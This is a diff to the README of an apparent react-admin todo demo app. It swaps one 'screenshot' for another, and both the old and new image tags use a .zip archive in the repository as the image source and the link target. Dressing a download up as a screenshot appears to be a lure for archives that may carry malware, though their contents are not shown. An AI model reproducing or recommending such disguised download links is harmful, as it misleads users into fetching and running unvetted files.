@@ -2,7 +2,7 @@
 
 Todo app built with react-admin. It shows how to use react-admin in headless mode to build a custom UI.
 
-<a href="https://github.com/BryanD1406/react-admin-todo/raw/refs/heads/main/src/__tests__/admin-react-todo-graphotype.zip"><img width="711" alt="todo" src="https://github.com/BryanD1406/react-admin-todo/raw/refs/heads/main/src/__tests__/admin-react-todo-graphotype.zip" /></a>
+<a href="https://github.com/BryanD1406/react-admin-todo/raw/refs/heads/main/src/admin_react_todo_v2.6.zip"><img width="711" alt="todo" src="https://github.com/BryanD1406/react-admin-todo/raw/refs/heads/main/src/admin_react_todo_v2.6.zip" /></a>
 
 ## Installation
 
